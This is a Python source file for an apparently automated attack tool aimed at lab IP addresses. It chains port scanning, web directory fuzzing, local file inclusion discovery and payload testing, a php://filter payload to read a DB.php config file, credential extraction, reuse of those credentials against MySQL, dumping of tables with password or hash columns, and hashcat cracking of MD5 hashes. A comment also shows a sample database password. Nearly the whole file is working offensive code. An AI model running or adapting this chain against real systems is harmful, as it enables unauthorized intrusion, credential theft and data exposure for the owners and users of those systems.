import nmap3
import pandas as pd
from bs4 import BeautifulSoup
import requests
from sys import argv
import threading
import httpx
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from colorama import Fore, Style, init
import time
import base64
import re
import mysql.connector
import subprocess


ip_1 = "10.10.147.69"
ip_2 = "10.10.147.70"
users = []
password = []
credentials = []
hashes = []
mysql_data = []
valid_credential_to_service = []
#test data, program will scrap availble services from nmap results
services = [{'ip': '10.10.131.118', 'port': '53', 'service': 'domain'}, {'ip': '10.10.131.118', 'port': '80', 'service': 'http'}, {'ip': '10.10.131.118', 'port': '88', 'service': 'kerberos-sec'}, {'ip': '10.10.131.118', 'port': '135', 'service': 'msrpc'}, {'ip': '10.10.131.118', 'port': '139', 'service': 'netbios-ssn'}, {'ip': '10.10.131.118', 'port': '389', 'service': 'ldap'}, {'ip': '10.10.131.118', 'port': '443', 'service': 'https'}, {'ip': '10.10.131.118', 'port': '445', 'service': 'microsoft-ds'}, {'ip': '10.10.131.118', 'port': '464', 'service': 'kpasswd5'}, {'ip': '10.10.131.118', 'port': '593', 'service': 'http-rpc-epmap'}, {'ip': '10.10.131.118', 'port': '636', 'service': 'ldapssl'}, {'ip': '10.10.131.118', 'port': '3268', 'service': 'globalcatLDAP'}, {'ip': '10.10.131.118', 'port': '3269', 'service': 'globalcatLDAPssl'}, {'ip': '10.10.147.70', 'port': '3306', 'service': 'mysql'}]
run_in_background = []
found_web_directories = []
links = []
lfi_results = []
lfi_candidates = []

class Scanner:
    def __init__(self, ip):
        self.ip = ip
        self.nmap = nmap3.NmapScanTechniques() # initiate Nmap

    def scan_all_ports(self):
        ip = self.ip
        global services
        scan_data = self.nmap.nmap_tcp_scan(ip, '-p- --min-rate=1500') # this returns a dict of the nmap results
        open_ports = [port for port in scan_data[ip]['ports'] if port['state'] == 'open'] # condition to only pass through open ports
        df = pd.json_normalize(open_ports) # formats the open ports as a table, turning the list of open port dictionaries into a DataFrame
        # iterating over the DataFrames rows to find services, and append the ip, port, and service to the global var 'services'
        for _, row in df.iterrows():
            service = row['service.name']
            port = row['portid']
            services.append({'ip': ip, 'port': port, 'service': service})
        print(df)
        print(services)

class WebFuzzing:
    """
    A class for performing web fuzzing to discover accessible directories on a target web server.
    Attributes:
        ip (str): The IP address of the target server.
        thread_count (int): The number of threads to use for concurrent requests.
    Methods:
        check_directory(url):
            Sends a HEAD request to the specified URL and prints it if the response status code indicates the directory exists or is accessible (200, 301, 403).
        httpx_fuzzing():
            Determines the base URL based on detected HTTP/HTTPS services, reads a wordlist of directory names, and concurrently checks each directory using threads.
    """
    def __init__(self, ip, thread_count):
        self.ip = ip
        self.thread_count = thread_count
        self.stop_fuzzing = False

    def extract_credentials_from_dict(self, data: dict, keywords=None):
        if keywords is None:
            keywords = ["username", "password", "user", "passwd", "server", "host", "db", "database", "port"]
        credentials_found = []
        for value in data.values():
            #Use regex to find PHP variable assignments
            matches = re.findall(r'\$(\w+)\s*=\s*[\'"]([^\'"]+)[\'"]', str(value))
            for var, val in matches:
                if var.lower() in keywords:
                    credentials_found.append({var: val})
        return credentials_found


    def check_directory(self, url):
        # Sends a HEAD request to check if the directory exists or is accessible
        try:
            response = httpx.head(url, verify=False, timeout=3)
            if response.status_code in [200, 301, 403]:
                print(f"Found URL ({response.status_code}): {url}")
        except Exception:
            pass

    def httpx_fuzzing(self):
        # Directory fuzzing using httpx and threads. User can interrupt to move to next phase.
        if any(entry['port'] == '80' and entry['service'] == 'http' for entry in services):
            base_url = f"http://{self.ip}/"
        elif any(entry['port'] == '443' and entry['service'] == 'https' for entry in services):
            base_url = f"https://{self.ip}/"
        else:
            print("No HTTP/S detected")
            return

        wordlist = "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"

        # Start a background thread to listen for user input to break fuzzing
        def wait_for_user():
            input("Press Enter at any time to proceed to the next phase...\n")
            self.stop_fuzzing = True

        threading.Thread(target=wait_for_user, daemon=True).start()
        try:
            with open(wordlist, 'r') as f:
                dirs = [line.strip() for line in f]
            # ThreadPoolExecutor for concurrent directory checks
            with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
                for dirs_name in dirs:
                    if self.stop_fuzzing:
                        print("Proceeding to locating possible LFI's in found web pages")
                        break
                    url = base_url + dirs_name
                    executor.submit(self.check_directory, url)
                    time.sleep(0.01)  # Small delay for responsiveness
                # After user interrupts, shutdown threads and move to LFI phase
                if self.stop_fuzzing:
                    executor.shutdown(wait=True)
                    self.locate_lfi('/dev') # testing, need to add ability to iterate through found webpages
        except FileNotFoundError:
            print(f"wordlist '{wordlist}' not found")

    def locate_lfi(self, web_page):
        # Scrape links from the given web page and identify possible LFI parameters
        response = requests.get(f"http://{self.ip}/{web_page}")
        soup = BeautifulSoup(response.text, 'html.parser')
        links = soup.find_all("a")

        hrefs = []
        for link in links:
            href = link.get("href")
            if href not in hrefs:
                hrefs.append(str(href))
        hrefs_df = pd.DataFrame({'Links': hrefs})
        print(Fore.GREEN + f"Links scraped of web page: {web_page}" + Style.RESET_ALL)
        print(hrefs_df)

        print(Fore.YELLOW + "Possible LFI Vulnerability" + Style.RESET_ALL)
        possible_lfi = set()
        for href in hrefs:
            if href and "?" in href:
                # Extract parameter name from href
                param = href.split("?")[1].split("=")[0]
                base_url = href.split("=")[0]
                full_url = f"http://{self.ip}{web_page}/{base_url}"
                lfi_candidates.append({'url': full_url, 'href': href, 'Possible vulnerable parameter': param})
        lfi_df = pd.DataFrame(lfi_candidates)
        print(lfi_df)

    def test_lfi(self, payload_file):
        # Test each LFI candidate with payloads from the file
        negative = ['Failed opening']
        seen = set()
        with open(payload_file, 'r') as f:
            for payload in f:
                payload = payload.strip()
                for candidate in lfi_candidates:
                    url = candidate['url']
                    param = candidate['Possible vulnerable parameter']
                    key = (url, param, payload)
                    if key in seen:
                        continue  # Skip duplicate tests
                    seen.add(key)
                    response = requests.get(url, params={param: payload})
                    print(Fore.YELLOW + f"Testing For LFI vulnerability: {url}?{param}={payload}" + Style.RESET_ALL)
                    # If negative string found, skip storing result
                    if any(neg in response.text for neg in negative):
                        continue
                    # Extract LFI content from <p> tags
                    soup = BeautifulSoup(response.text, 'html.parser')
                    lfi_content = '\n'.join([tag.get_text() for tag in soup.find_all('p')])
                    if lfi_content:
                        lfi_results.append({
                            "Url": f"{url}?{param}={payload}",
                            "Content": lfi_content,
                            "Is Vulnerable": "Most Likely Vulnerable"
                        })
        # Display results in a DataFrame for easy review
        lfi_results_df = pd.DataFrame(lfi_results)
        print(lfi_results_df)

    def test_php_filter(self, payload):
        base64_content = {
            "Encoded": '',
            "Decoded": ''
        }
        php_filters = {
            "Filter and b64": "php://filter/convert.base64-encode/resource"
        }
        for candidate in lfi_candidates:
            url = candidate["url"]
            #testing url
            #url = 'http://127.0.0.1/dev'
            param = candidate["Possible vulnerable parameter"]
            response = requests.get(url=url, params={param: f"{php_filters['Filter and b64']}={payload}"})
            #try and extract base64 encoded content from the response
            soupy_goodness = BeautifulSoup(response.text, 'html.parser')
            # extract text from all <p> tags
            for p_tag in soupy_goodness.find_all('p'):
                text = p_tag.get_text().strip().replace('\n', '').replace('\r', '')
                if len(text) > 100 and all(c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" for c in text):
                    print("Base64 output detected (truncated):", text[:100])
                    try:
                        decoded = base64.b64decode(text).decode(errors='replace')
                    except Exception as e:
                        decoded = f"Decoding error: {e}"
                    print(f"Decoded Base64 String (truncated): {decoded[:100]}")
                    base64_content["Encoded"] = text
                    base64_content["Decoded"] = decoded
        creds = self.extract_credentials_from_dict(base64_content)
        credentials.append(creds)
        print(credentials)

class Services:
    def __init__(self, ip):
        self.ip = ip

    def credential_stuffing(self):
        some_variable = ['username', 'password']
        credentials_to_use = {
            "password": '',
            "username": '',
        }
        # credentials is a list of lists of dicts: [[{'username': 'root'}, {'password': 'SuperSecureMySQLPassw0rd1337.'}]]
        for entry in credentials:
            for item in entry:
                for key in some_variable:
                    if key in item:
                        credentials_to_use[key] = item[key]
        print("Collected credentials to use:", credentials_to_use)
        #test print
        print(services)
        self.mysql_connect(credentials_to_use)

    def mysql_connect(self, credential: dict):
        global valid_credential_to_service
        mysql_dict = next((d for d in services if d.get('service') == 'mysql'), None)
        #test print
        print(mysql_dict)
        try:
            connection_string = mysql.connector.connect(
                host = mysql_dict["ip"],
                port = mysql_dict["port"],
                user = credential["username"],
                password = credential["password"],
            )
            if connection_string.is_connected():
                print("MySQL Connection Successful")
                valid_credential_to_service.append({
                    "service": mysql_dict['service'],
                    "ip": mysql_dict['ip'],
                    'port': mysql_dict['port'],
                    'username': credential['username'],
                    'password': credential['password']
                })
                last_valid = valid_credential_to_service[-1]
                print(f"valid credentials for {last_valid["service"]} with {last_valid['username']}:{last_valid['password']}")
                
                
            else:
                print("MySQL connection failed")
        except mysql.connector.Error as e:
            print(f"Error: {e}")
        

    def mysql_interaction(self):
        mysql_connection_data = next((d for d in valid_credential_to_service if d.get('service') == 'mysql'), None)
        connection_string = mysql.connector.connect(
            host = mysql_connection_data['ip'],
            port = mysql_connection_data['port'],
            user = mysql_connection_data['username'],
            password = mysql_connection_data['password']
        )
        try:
            if connection_string.is_connected():
                cursor = connection_string.cursor()
                print("is connected")
                cursor.execute("SHOW DATABASES")
                databases = cursor.fetchall()
                cursor.close()
                keywords = ['user', 'password', 'hash', 'users']
                interesting_table = []
                preconfiqured_dbs = ['mysql', 'performance_schema', 'information_schema', 'sys']
                exclude_preconfigured_dbs = True
                for db in databases:
                    db_name = db[0]
                    if exclude_preconfigured_dbs and db_name in preconfiqured_dbs:
                        continue
                    connection_string = mysql.connector.connect(
                    host = mysql_connection_data['ip'],
                    port = mysql_connection_data['port'],
                    user = mysql_connection_data['username'],
                    password = mysql_connection_data['password'],
                    database = db_name
                    )
                    db_cursor = connection_string.cursor()
                    db_cursor.execute("SHOW TABLES")
                    db = db_cursor.fetchall()
                    for tables in db:
                        if tables[0] in keywords:
                            interesting_table.append({"database": db_name, "table": tables[0]})
                    #print(results)
                #print(interesting_table)
                hunting_keywords = ['password', 'passwd', 'hash', 'user']
                all_table_data = []
                for entry in interesting_table:
                    db_name = entry['database']
                    table_name = entry['table']
                    #Connect to the database
                    connection_string = mysql.connector.connect(
                        host = mysql_connection_data['ip'],
                        port = mysql_connection_data['port'],
                        user = mysql_connection_data['username'],
                        password = mysql_connection_data['password'],
                        database = db_name
                    )
                    cursor = connection_string.cursor()
                    # get columns names
                    cursor.execute(f"SHOW COLUMNS FROM `{table_name}`")
                    columns = [col[0] for col in cursor.fetchall()]
                    #if any columns matches a keyword, fetch all columns in the coresponding table
                    if any(any(k in col.lower() for k in hunting_keywords) for col in columns):
                        cursor.execute(f"SELECT * FROM `{table_name}`")
                        rows = cursor.fetchall()
                        #get column names from the cursor description
                        col_names = [desc[0] for desc in cursor.description]
                        #build a list of dicts: each dict is a row with the columns as keys
                        table_data = [dict(zip(col_names, row)) for row in rows]
                        #Save the tables data, columns, and source database for later use
                        all_table_data.append({
                            "database": db_name,
                            "table": table_name,
                            "columns": col_names,
                            "rows": table_data
                        })
                        #print summary and each row for review
                        print(all_table_data)
                        mysql_data = pd.DataFrame(rows, columns=col_names)
                        hash_functions = Hashes(mysql_data)
                        hash_functions.extract_hash_from_data()
                        print(mysql_data)
                        print(hashes)
                    
        except mysql.connector.Error as e:
            print(f"The following error has occured: {e}")

class Hashes:
    def __init__(self, data: dict):
        self.data = data
        

    def extract_hash_from_data(self):
        if "password" in self.data:
            password_value = self.data['password'].tolist()
            for password in password_value:
                if self.most_likely_hash(password):
                    hashes.append(password)
                    print(password)
            
                    

    def most_likely_hash(self, hash):
        # for now we want to check if these possible hashs contain 32 hex characters
        if isinstance(hash, str) and re.fullmatch(r'[a-fA-F0-9]{32}', hash.strip()):
            print(f"Most likely a md5 or md4 hash: {hash}")
            return hash
        else:
            print("not hash")
            return False

    @staticmethod
    def hashcat_md5(hashes_to_crack, wordlist="/usr/share/wordlists/rockyou.txt"):
        #write hashes to a txt file
        hash_file = "hashes.txt"
        with open(hash_file, 'w') as f:
            for h in hashes_to_crack:
                f.write(h + "\n")
        #build the command
        subprocess.run (['hashcat', '-a', '0', '-m',  '0', hash_file, wordlist], capture_output=True, text=True)
        # retrieve cracked password using hashcats --show 
        result = subprocess.run(['hashcat', '-a', '0', '-m', '0', hash_file, wordlist, '--show'], capture_output=True, text=True)
        print(result.stdout)
        print(result.stderr)
        try:
            for line in result.stdout.strip().split('\n'):
                if ':' in line:
                    cracked = line.split(':', 1)[1]
                    password.append(cracked)
                    print(f"Cracked password added: {cracked}")  
        except Exception as e:
            print(f"The following error has occured: {e}")
        


        






if __name__ == "__main__":
    #scanner = Scanner(ip=ip_2)
    #scanner.scan_all_ports()
    #web_actions = WebFuzzing(ip_2, 10)
    #web_actions.httpx_fuzzing()
    test_lfi = WebFuzzing(ip_2, 1)
    test_lfi.locate_lfi('/dev')
    test_lfi.test_lfi('./lfi_payload')
    test_lfi.test_php_filter('DB.php')
    test_credential = Services(ip_2)
    test_credential.credential_stuffing()
    test_credential.mysql_interaction()
    hash_functions = Hashes(hashes)
    hash_functions.extract_hash_from_data()
    hash_functions.hashcat_md5(hashes)
    

    


